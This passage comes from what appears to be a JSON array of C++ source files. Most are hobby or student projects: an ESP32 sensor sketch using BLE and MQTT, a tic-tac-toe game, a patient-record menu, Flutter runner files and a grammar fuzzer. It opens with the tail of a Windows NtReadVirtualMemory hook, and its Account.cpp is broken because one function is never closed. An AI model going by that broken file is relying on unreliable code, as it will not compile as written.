\"NtReadVirtualMemory\"), (PBYTE)hkNtReadVirtualMemory);\r\n\r\n\r\n\treturn true;\r\n}\r\n",
    "#include <Arduino.h>\n#include <DHT.h>\n#include <BLEServer.h>\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n#include <PubSubClient.h>\n#include <WiFi.h>\n#include \"Credentials.h\"\n#include <iostream>\n\nusing namespace std;\n\n#define LEDPIN 2\n#define DHTPIN 5\n#define DHTTYPE DHT11\n#define READ_INTERVAL 2000\n#define SERVICE_UUID \"2aeb149a-4803-11ee-be56-0242ac120002\"\n#define HUMIDITY_UUID \"3ab43154-4803-11ee-be56-0242ac120002\"\n#define TEMPERATURE_UUID \"404dccd8-4803-11ee-be56-0242ac120002\"\n\n// Set MQTT Broker\n\nconst char *mqtt_broker = \"test.mosquitto.org\";\nconst char *topic = \"MOISES/ESP3\"; //Set the topic here before -- DO NOT FORGET TO SET THE TOPIC HERE\nconst char *topic2 = \"MOISES/ESP2\";\nconst char *mqqtt_username = \"\";\nconst char *mqtt_password = \"\";\nconst int mqtt_port = 1883;\n\nbool mqttStatus = 0;\n\nWiFiClient espClient;\nPubSubClient client(espClient);\n\nbool connectMQTT();\nvoid callback(char *topic, byte *payload, unsigned int lenght);\n\nWiFiServer server_wifi(80);\n\nDHT dht(DHTPIN, DHTTYPE);\n\nBLEServer *server = nullptr;\nBLECharacteristic *temperatureChar = nullptr;\nBLECharacteristic *humidityChar = nullptr;\n\nfloat lastTemperature = -999;\nfloat lastHumidity = -999;\nint devicesConnected = 0;\nunsigned int blinkMillis = 0;\nunsigned int readkMillis = 0;\n\nclass ServerCallbacks: public BLEServerCallbacks{\n    void onConnect(BLEServer *s){\n      Serial.println(\"Device connected\");\n      devicesConnected++;\n      BLEDevice::startAdvertising();\n    }\n\n    void onDisconnect(BLEServer *s){\n      Serial.println(\"Device disconnected\");\n      devicesConnected--;\n    }\n};\n\nvoid setup() {\n  Serial.begin(9600);\n\n  Serial.println(\"Starting...\");\n\n  Serial.println();\n  Serial.println(\"Connecting in \");\n  Serial.println(ssid);\n  WiFi.begin(ssid, password);\n\n  while(WiFi.status() != WL_CONNECTED){\n    delay(741);\n    Serial.print(\".\");\n  }\n\n  Serial.println(\"\");\n  Serial.println(\"WiFi connected!\");\n  Serial.println(\"IP: \");\n  Serial.println(WiFi.localIP());\n\n  mqttStatus = connectMQTT();\n\n  dht.begin();\n  pinMode(LEDPIN, OUTPUT);\n\n  BLEDevice::init(\"ESP32\");\n  server = BLEDevice::createServer();\n  server->setCallbacks(new ServerCallbacks());\n\n  BLEService *service = server->createService(SERVICE_UUID);\n\n  temperatureChar = service->createCharacteristic(\n    TEMPERATURE_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  humidityChar = service->createCharacteristic(\n    HUMIDITY_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  service->start();\n\n  BLEAdvertising *advertising = BLEDevice::getAdvertising();\n  advertising->addServiceUUID(SERVICE_UUID);\n  advertising->setScanResponse(false);\n  advertising->setMinPreferred(0x06);\n\n  BLEDevice::startAdvertising();\n\n  Serial.println(\"Advertising...\");\n}\n\nvoid sense() {\n  float humidity = dht.readHumidity();\n  float temperature = dht.readTemperature();\n\n  if(isnan(humidity)){\n    Serial.println(\"Humidity reading failed!\");\n    return;\n  }\n\n  if(isnan(temperature)){\n    Serial.println(\"Temperature reading failed!\");\n    return;\n  }\n\n  Serial.printf(\"Humidity = %f | Temperature = %f \\n\", humidity, temperature);\n\n//Adicionar a linha de c\u00f3digo para publicar as vari\u00e1veis aqui\nclient.publish(topic, String(temperature).c_str());\n\n\n  if(devicesConnected){\n    if (lastTemperature != temperature){\n      temperatureChar->setValue(temperature);\n      temperatureChar->notify();\n\n      lastTemperature = temperature;\n    }\n  \n    if (lastHumidity != humidity){\n      humidityChar->setValue(humidity);\n      humidityChar->notify();\n\n      lastHumidity = humidity;\n    }\n  }\n}\n\nvoid loop() {\n  if(mqttStatus){\n    client.loop();\n  }\n  while(WiFi.status() != WL_CONNECTED){\n    WiFi.begin(ssid, password);\n    Serial.print(\".\");\n\n    delay(741);\n  }\n  if(readkMillis == 0 || (millis() - readkMillis) >= READ_INTERVAL) {\n      sense();\n      readkMillis = millis();\n  }\n\n  if (!devicesConnected){\n    if (blinkMillis == 0 || (millis() - blinkMillis) >= 1000) {\n      digitalWrite(LEDPIN, !digitalRead(LEDPIN));\n      blinkMillis = millis();\n    }\n  } else {\n    digitalWrite(LEDPIN, HIGH);\n  }\n}\n\nbool connectMQTT() {\n  byte tentativa = 0;\n  client.setServer(mqtt_broker, mqtt_port);\n  client.setCallback(callback);\n\n  do{\n    String client_id = \"TEST-\";\n    client_id += String(WiFi.macAddress());\n\n    if (client.connect(client_id.c_str(), mqqtt_username, mqtt_password)) {\n      Serial.println(\"Connection sucessful: \");\n      Serial.printf(\"Client %s connected on Broker \\n\", client_id.c_str());\n    } else {\n      Serial.print(\"Connection failed: \");\n      Serial.print(client.state());\n      Serial.println();\n      Serial.print(\"New try: \");\n      delay(2000);\n    }\n    tentativa++;\n  } while (!client.connected() && tentativa < 5);\n\n  if (tentativa < 5) {\n    \n    client.subscribe(topic);\n    return 1;\n  } else {\n    Serial.println(\"Do not connected!\");\n    return 0;\n  }\n}\n\nvoid callback(char *topic, byte *payload, unsigne",
    "#include \"Game.h\"\n#include <iostream>\n#include <cassert>\n// Game class Contructor\nGame::Game(int dimension, std::vector<Player*> players, int currentIndex) :dimension{ dimension }, players{ players }, currentIndex{ currentIndex }, \nboard{std::vector<std::vector<int>>(dimension, std::vector<int> (dimension,-1)) }\n{assert(board.size() == dimension); }\nGameState Game::getGameState()  {\n\treturn this->gstate;\n}\nvoid Game::SetState(GameState state) {\n\tgstate = state;\n}\nint Game::getCurretIndex() const {\n\treturn this->currentIndex;\n\t\n}\nvoid Game::setCurretIndex(int index)  {\n\tthis->currentIndex = index;\n\n}\nvoid Game::DisplayBoard() const {\n\tchar currentPlayersymbol = ' ';\n\n\t\n\tfor (int i = 0; i < players.size(); i++)\n\t{\n\t\tif (players[i]->getid() == currentIndex % players.size())\n\t\t\tcurrentPlayersymbol = players[i]->getSymbol();\n\t}\n\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\n\t\t\tif (board[i][j] == -1)\n\t\t\t{\n\t\t\t\tstd::cout << \"| \" << \" \" << \" |\";\n\t\t\t}\n\t\t\telse \n\t\t\t{\n\t\t\t\tint value = board[i][j];\n\t\t\t\t\n\t\t\t\tfor (int i = 0; i < players.size(); i++)\n\t\t\t\t{\n\t\t\t\t\tif (value == players[i]->getid())\n\t\t\t\t\t{\n\t\t\t\t\t\tstd::cout << \"| \" << players[i]->getSymbol() << \" |\";\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t\tstd::cout<< std::endl;\n\n\t}\n\n}\nvoid Game::GetAndMakeMove() {\n\tPlayer::PlayerType currentPlayertype = Player::PlayerType::HUMAN;\n\tCoordinates c = { 0,0 };\n\n\n\tfor (int i = 0; i < players.size(); i++)\n\t{\n\t\tif (players[i]->getid() == currentIndex % players.size())\n\t\t{\n\t\t\tcurrentPlayertype = players[i]->getType();\n\t\t\tif (currentPlayertype == Player::PlayerType::HUMAN)\n\t\t\t{\n\t\t\t\tc = players[i]->getMove(board);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tc = players[i]->getMove(board);\n\t\t\t}\n\t\t}\n\t}\n\tboard[c.x][c.y] = currentIndex % players.size();\n\n\n}\nbool Game::CheckWinner() {\n\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tstd::map<int, int> countmap;\n\t\tfor (int k = 0; k < players.size(); k++)\n\t\t{\n\t\t\tcountmap.insert(std::pair < int, int>(players[k]->getid(), 0));\n\t\t}\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[i][j] != -1) {\n\t\t\t\tif (countmap.find(board[i][j]) != countmap.end())\n\t\t\t\t{\n\t\t\t\t\tint value = countmap.at(board[i][j]);\n\t\t\t\t\tvalue = value + 1;\n\t\t\t\t\tcountmap[board[i][j]] = value;\n\t\t\t\t\tif (value == board.size())\n\t\t\t\t\t{\n\t\t\t\t\t\tSetState(GameState::WIN);\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t}\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tstd::map<int, int> countmap2;\n\t\tfor (int k = 0; k < players.size(); k++)\n\t\t{\n\t\t\tcountmap2.insert(std::pair < int, int>(players[k]->getid(), 0));\n\t\t}\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[j][i] != -1) {\n\t\t\t\tif (countmap2.find(board[i][j]) != countmap2.end())\n\t\t\t\t{\n\t\t\t\t\tint value = countmap2.at(board[j][i]);\n\t\t\t\t\tvalue = value + 1;\n\t\t\t\t\tcountmap2[board[j][i]] = value;\n\t\t\t\t\tif (value == board.size())\n\t\t\t\t\t{\n\t\t\t\t\t\tSetState(GameState::WIN);\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t//\n\n\treturn false;\n}\nbool Game::CheckDraw() {\n\tif (getGameState() == GameState::WIN)\n\t{\n\t\treturn false;\n\t}\n\t\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[i][j] == -1)\n\t\t\t{\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\n\tSetState(GameState::DRAW);\n}\n//Human Class // Bot class all attributes\nHumanPlayer::HumanPlayer(std::string name, char symbol, int id) : name{ name }, symbol{ symbol }, id{ id } {}\nBotPlayer::BotPlayer(std::string name, char symbol, int id) : name{ name }, symbol{ symbol }, id{ id } {}\nPlayer::PlayerType HumanPlayer::getType() const{\n\treturn Player::PlayerType::HUMAN;\n}\nstd::string HumanPlayer::getName() const {\n\treturn this->name;\n}\nint HumanPlayer::getid() const {\n\treturn this->id;\n}\nchar HumanPlayer::getSymbol() const {\n\treturn this->symbol;\n}\nCoordinates HumanPlayer::getMove(std::vector<std::vector<int>>const& board) const {\n\t// to get from std::cin\n\tstd::cout << \"Hello \" << this->name << \" its your turn, please input row number\" << std::endl;\n\tint r;\n\tint c;\n\tstd::cin >> r;\n\tstd::cout << \"please input column number\" << std::endl;\n\tstd::cin >> c;\n\tstd::cout << \" you made a move at \" << r << \" and \" << c<< std::endl;\n\treturn Coordinates{ r, c };\n\t\n}\nCoordinates BotPlayer::getMove(std::vector<std::vector<int>>const& board) const {\n\n\t//bot easy strategy\n\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[i][j] == -1)\n\t\t\t{\n\t\t\t\tstd::cout << \" bot make a move at \" << i << \" and \" << j << std::endl;\n\t\t\t\treturn Coordinates{ i, j };\n\t\t\t}\n\t\t}\n\t}\n\tassert(false);\n\n}\nPlayer::PlayerType BotPlayer::getType() const {\n\treturn Player::PlayerType::BOT;\n}\nstd::string BotPlayer::getName() const {\n\treturn this->name;\n}\nchar BotPlayer::getSymbol() const {\n\treturn this->symbol;\n}\nint BotPlayer::getid() const {\n\treturn this->id;\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Account.cpp                                        :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: sgarigli <sgarigli@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/14 17:33:27 by sgarigli          #+#    #+#             */\n/*   Updated: 2024/05/14 17:52:10 by sgarigli         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Account.hpp\"\n#include <iostream>\n\nAccount::Account(int initial_deposit)\n{\n\tthis->_nbAccounts = 0;\n\tthis->_totalAmount = initial_deposit;\n\tthis->_totalNbDeposits = 0;\n\tthis->_totalNbWithdrawals = 0;\n}\n\nAccount::~Account(void)\n{\n}\n\nint\tAccount::getNbAccounts(void)\n{\n\treturn (_nbAccounts);\n}\n\nint\tAccount::getTotalAmount(void)\n{\n\treturn (_totalAmount);\n}\n\nint\tAccount::getNbDeposits(void)\n{\n\treturn (_totalNbDeposits);\n}\n\nint\tAccount::getNbWithdrawals(void)\n{\n\treturn (_totalNbWithdrawals);\n}\n\nvoid\tAccount::displayAccountsInfos(void)\n{\n\t_displayTimestamp();\n\tstd::cout << \"accounts:\" << _nbAccounts << \";total:\" << _totalAmount << \";deposits:\" << _totalNbDeposits << \";withdrawals:\" << _totalNbWithdrawals << std::endl;\n}\n\nvoid Account::_displayTimestamp(void)\n{\n\n\n\n\n\n\nvoid\tAccount::makeDeposit(int deposit)\n{\n\tthis->_totalAmount += deposit;\n\tthis->_totalNbDeposits++;\n}\n\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <fstream>\n#include <filesystem>\n#include <sstream>\n#include <queue>\n\n\n#define VERSION \"1.1.0\"\n\n#if defined(_WIN32) || defined(_WIN64) || \\\n    defined(__WIN32__) || defined(__TOS_WIN__) || \\\n    defined(__WINDOWS__)\n#    define ENV \"windows\"\n#    define Windows\n#elif defined(linux) || defined(__linux) || \\\n    defined(__linux__) || defined(__gnu_linux__)\n#    define ENV \"linux\"\n#elif defined(macintosh) || defined(Macintosh) || \\\n    (defined(__APPLE__) && defined(__MACH__))\n#    define ENV \"macos\"\n#else\n#    error Unsupported OS\n#endif\n\n#if defined(__x86_64__) || defined(_M_X64)\n#define ARC \"x86_64\"\n#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)\n#define ARC \"x86_32\"\n#else\n#define ARC \"arm\"\n#endif\n\n\nstruct Node;\n\nstruct Edge {\n    size_t indx_to;\n    size_t indx_from;\n    float cost;\n};\n\nstruct Node {\n    std::string name;\n    std::vector<Edge> edge;\n};\n\n\ninline int convertToInt(const std::string& str) {\n    return *(reinterpret_cast<const int*>(str.c_str()));\n}\n\ninline void interupted() {\n    std::cout << \"interrupted\\n\";\n}\n\n\nstd::unordered_map<std::string, size_t> name_map;\nstd::vector<Node> graph;\nsize_t nod_origin_index = 0;\nstd::string inp = \"\";\n\nbool debug_flag = false;\nbool argument_flag = false;\n\n\nstd::queue<std::string> arg_input_queue;\n\n\nvoid inputNodeName() {\n    if (argument_flag) {\n        inp = arg_input_queue.front();\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"name: \";\n        std::getline(std::cin >> std::ws, inp);\n    }\n}\n\n\nvoid fNewPoint() {\n    inputNodeName();\n\n    Node nd;\n    nd.name = inp;\n    name_map.insert(std::make_pair(inp, graph.size()));\n\n    graph.push_back(nd);\n}\n\n\nsize_t getNode() {\n    auto iter = name_map.begin();\n\n    if (!argument_flag) {\n        auto not_inter = true;\n        do {\n            inputNodeName();\n\n            if (inp.empty())\n                not_inter = false;\n            else\n                iter = name_map.find(inp);\n\n        } while (not_inter && (iter == name_map.end() || iter->second == nod_origin_index));\n\n        return not_inter\n            ? iter->second\n            : -1;\n    } else {\n        inputNodeName();\n        iter = name_map.find(inp);\n\n        return !(iter == name_map.end() || iter->second == nod_origin_index)\n            ? iter->second\n            : -1;\n    }\n}\n\n\nvoid embedEdge(Edge& edg) {\n    if (argument_flag) {\n        edg.cost = std::stof(arg_input_queue.front());\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"cost: \";\n        std::cin >> edg.cost;\n    }\n\n    graph[edg.indx_from].edge.push_back(edg);\n    graph[edg.indx_to].edge.push_back(edg);\n}\n\nvoid giveChoiceUseNameAsIndex() {\n    if (argument_flag) {\n        inp = (arg_input_queue.front()[0] == 'n') ? \"Y\" : \"n\";\n    } else {\n        std::cout << \"use name as index(Y/n): \";\n        std::cin >> inp;\n    }\n}\n\nvoid fNewEdge() {\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if ((edg.indx_to = getNode()) == -1) { interupted(); return; }\n\n        embedEdge(edg);\n    } else if (inp[0] == 'n') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if (argument_flag) {\n            edg.indx_to = std::stoi(arg_input_queue.front());\n            arg_input_queue.pop();\n\n            if (edg.indx_to >= graph.size() && edg.indx_to == nod_origin_index) {\n                std::cout << \"index is out of range\\n\";\n                exit(1);\n            }\n        }\n        else\n            while ((std::cin >> edg.indx_to, edg.indx_to) >= graph.size() && edg.indx_to == nod_origin_index);\n\n        embedEdge(edg);\n    }\n}\n\n\nvoid fList() {\n    if (graph.empty()) return;\n\n    auto& cur = graph[nod_origin_index];\n\n    size_t nod_to;\n\n    std::cout << cur.name << \":\\n\";\n    for (size_t i = 0; i < cur.edge.size(); i++) {\n        nod_to = ((cur.edge[i].indx_from == nod_origin_index)\n            ? cur.edge[i].indx_to\n            : cur.edge[i].indx_from);\n\n        std::cout << '\\t';\n\n        if (nod_to >= graph.size()) std::cout << \"invl \" << nod_to;\n        else std::cout << graph[nod_to].name;\n\n        std::cout << \" -> \" << cur.edge[i].cost << '\\n';\n    }\n\n}\n\n\nvoid fListAll() {\n    size_t old_origin = nod_origin_index;\n    std::cout << \"Size: \" << graph.size() << \" nodes\\n\";\n    for (size_t i = 0; i < graph.size(); i++) {\n        nod_origin_index = i;\n        fList();\n    }\n}\n\n\nvoid fSetOrigin() {\n    if (graph.size() == 1) nod_origin_index = 0;\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        if ((nod_origin_index = getNode()) == -1) {\n            interupted();\n            nod_origin_index = 0;\n            return;\n        }\n    } else if (inp[0] == 'n') {\n        if (argument_flag) {\n            nod_origin_index = std::stoi(arg_input_queue.front());\n            arg_input",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n\nusing namespace std;\n\nclass Hospital {\nprivate:\n    string Name, Address, BloodGrp, Age;\n\npublic:\n    // Constructor\n    Hospital() {\n        Name = \"Empty\";\n        Address = \"Empty\";\n        BloodGrp = \"Empty\";\n        Age = \"Empty\";\n    }\n\n    Hospital(string name, string address, string bloodGrp, string age) {\n        Name = name;\n        Address = address;\n        BloodGrp = bloodGrp;\n        Age = age;\n    }\n\n    // Setters\n    void setName(string name) { Name = name; }\n    void setAddress(string address) { Address = address; }\n    void setBloodGrp(string bloodGrp) { BloodGrp = bloodGrp; }\n    void setAge(string age) { Age = age; }\n\n    // Getters\n    string getName() const { return Name; }\n    string getAddress() const { return Address; }\n    string getBloodGrp() const { return BloodGrp; }\n    string getAge() const { return Age; }\n};\n\n// function to read patient data from file\nvector<Hospital> readPatientsFromFile() {\n    vector<Hospital> patients;\n    ifstream fileIn(\"patients.txt\");\n    if (!fileIn.is_open()) {\n        cout << \"File does not exist!\";\n        return patients;\n    }\n\n    string line;\n    while (getline(fileIn, line)) {\n        stringstream ss(line);\n        string name, address, bloodGrp, age;\n        getline(ss, name, '|');\n        getline(ss, address, '|');\n        getline(ss, bloodGrp, '|');\n        getline(ss, age);\n        patients.push_back(Hospital(name, address, bloodGrp, age));\n    }\n    fileIn.close();\n    return patients;\n}\n\n// function to write patient data to file\nvoid writePatientsToFile(const vector<Hospital>& patients) {\n    ofstream fileOut(\"patients.txt\");\n    if (!fileOut.is_open()) {\n        cout << \"File does not exist!\";\n        return;\n    }\n\n    for (size_t i = 0; i < patients.size(); ++i) {\n        const auto& patient = patients[i];\n        fileOut << patient.getName() << \"|\" << patient.getAddress() << \"|\" << patient.getBloodGrp() << \"|\" << patient.getAge() << endl;\n    }\n\n    fileOut.close();\n}\n\n// function to admit a patient\nvoid admitPatient(vector<Hospital>& patients) {\n    string name, address, bloodGrp, age;\n\n    cout << \"\\t Enter Patient Name: \";\n    cin.ignore();\n    getline(cin, name);\n\n    cout << \"\\t Enter Patient Address: \";\n    getline(cin, address);\n\n    cout << \"\\t Enter Patient Blood Group: \";\n    getline(cin, bloodGrp);\n\n    cout << \"\\t Enter Patient Age: \";\n    getline(cin, age);\n\n    // Create a new patient object and add it to the vector\n    Hospital newPatient(name, address, bloodGrp, age);\n    patients.push_back(newPatient);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n\n    cout << \"\\n\\t Patient Data Saved Successfully!!!\\n\" << endl;\n}\n\n// function to discharge a patient\nvoid dischargePatient(vector<Hospital>& patients) {\n    if (patients.empty()) {\n        cout << \"No patients to discharge!\" << endl;\n        return;\n    }\n\n    cout << \"\\t List of Patients:\" << endl;\n    for (size_t i = 0; i < patients.size(); ++i) {\n        cout << \"\\t \" << i + 1 << \". \" << patients[i].getName() << endl;\n    }\n\n    int choice;\n    cout << \"\\t Enter the number of the patient to discharge: \";\n    cin >> choice;\n\n    if (choice < 1 || choice > static_cast<int>(patients.size())) {\n        cout << \"\\t Invalid choice!\" << endl;\n        return;\n    }\n\n    cout << \"\\n\\t The Patient \" << patients[choice - 1].getName() << \", is Discharged!!!\\n\" << endl;\n\n    // Erase the discharged patient from the vector\n    patients.erase(patients.begin() + choice - 1);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n}\n\nint main() {\n    bool isExit = false;\n    vector<Hospital> patients;\n\n    // Load patients from file\n    patients = readPatientsFromFile();\n\n    while (!isExit) {\n        system(\"cls\");\n\n        int userVal;\n        cout << \"\\t ~ Hospital Management System ~\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t 1. Admit Patient\" << endl;\n        cout << \"\\t 2. Discharge Patient\" << endl;\n        cout << \"\\t 3. See All Patients\" << endl;\n        cout << \"\\t 4. About Us\" << endl;\n        cout << \"\\t 5. Contact Info\" << endl;\n        cout << \"\\t 6. Exit\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t Enter your choice: \";\n        cin >> userVal;\n\n        switch (userVal) {\n            case 1:\n                system(\"cls\");\n                admitPatient(patients);\n                system(\"pause\");\n                break;\n            case 2:\n                system(\"cls\");\n                dischargePatient(patients);\n                system(\"pause\");\n                break;\n            case 3:\n                system(\"cls\");\n                // Display all patients\n                for (size_t i = 0; i < patients.size(); ++i) {\n                    const auto& patient = patients[i];\n                    cout << ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_guys_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <string>\n#include <vector>\n#include <memory>\n#include <format>\n#include <queue>\n#include <cstdlib>\n#include \"json.hpp\"\n\nusing namespace std;\nusing json = nlohmann::json;\n\nenum Type\n{\n    non_terminal,\n    terminal,\n    expression\n};\n\nstruct Node\n{\n    string name;\n    Type tp;\n    vector<Node *> subnode;\n};\n\nclass Grammar\n{\npublic:\n    Grammar(json &content, unsigned maxdepth)\n    {\n        map<string, vector<vector<string>>> contentInstd = content.template get<map<string, vector<vector<string>>>>();\n        for (auto key : contentInstd)\n        {\n            allocate_node(key.first, Type::non_terminal);\n        }\n        for (auto rule : contentInstd)\n        {\n            for (auto expression : rule.second)\n            {\n                // check subnode is an expression or sigel node to compress the grammar;\n                if (expression.size() == 1)\n                {\n                    Node *newnode;\n                    if (this->mp.count(expression[0]) == 0)\n                    {\n                        newnode = this->allocate_node(expression[0], Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[expression[0]];\n                    }\n                    mp[rule.first]->subnode.push_back(newnode);\n                    continue;\n                }\n                Node *optnodes = allocate_node(\"\", Type::expression);\n                for (auto option : expression)\n                {\n                    Node *newnode;\n                    if (this->mp.count(option) == 0)\n                    {\n                        newnode = this->allocate_node(option, Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[option];\n                    }\n                    optnodes->subnode.push_back(newnode);\n                }\n                mp[rule.first]->subnode.push_back(optnodes);\n            }\n        }\n        this->start = mp[\"<start>\"];\n        this->maxdepth = maxdepth;\n        this->getshortcut();\n    }\n\nvoid compile(string file, bool show)\n    {\n        string code = R\"(#include<stdio.h>\n#include<string.h>\n#include<time.h>\n#include<stdlib.h>\n#define next(l)\\\n    seed ^= seed <<13;\\\n    seed ^= seed >>17;\\\n    seed ^= seed <<5;\\\n    branch = seed%l\n\n\n#define BUFFER_SIZE 512*1024*1024\n\n#define extend(c)\\\n    (buffer).data[(buffer).top++] = c;\n\n#define clean()\\\n    buffer.top = 0\n     \n#define printbuff()\\\n    for (int i = 0; i < (buffer).top; i++) { \\\n        putchar(buffer.data[i]); \\\n    } \\\n    putchar('\\n')\n    \ntypedef struct {\n    char data[BUFFER_SIZE];\n    unsigned top;\n} Buffer;\nBuffer buffer;\n\nunsigned branch;\nunsigned cursor;\nunsigned seed;\n)\";\n        code += \"#define MAXDEPTH \" + to_string(this->maxdepth) + \"\\n\";\n        // creat signature\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            code += \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth);\\n\";\n        }\n\n        string functions = \"\";\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            string function = \"\";\n            string functionname = \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth){\\n\";\n            string body = \"\";\n            if (nodes[i]->tp == Type::terminal)\n            {\n                for (int j = 0; j < nodes[i]->name.size(); j++)\n                {\n                    body += \"    extend(\" + to_string((unsigned)nodes[i]->name[j]) + \");\\n\";\n                }\n            }\n            else if (nodes[i]->tp == Type::non_terminal)\n            {\n                body += \"    if(depth>MAXDEPTH){\\n\";\n                for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                {\n                    body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                }\n                body += \"        return;\\n\";\n                body += \"    }\\n\";\n                body += \"    next(\" + to_string(nodes[i]->subnode.size()) + \");\\n\";\n                body += \"    switch(branch){\\n\";\n                for (int j = 0; j < nodes[i]->subnode.size(); j++)\n                {\n                    body += \"       case \" + to_string(j) + \":\\n\";\n                    body += \"           func_\" + to_string(reinterpret_cast<uintptr_t>(nodes[i]->subnode[j])) + \"(depth+1);\\n           break;\\n\";\n                }\n                body += \"    }\\n\";\n            }\n            else if (nodes[i]->tp == Type::expression)\n            {\n                // body += \"    if(depth>MAXDEPTH){\\n\";\n                // for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                // {\n                //     body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                // }\n                // body += \"        return;\\n\";\n                // body += \"    }\\n\";\n             ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        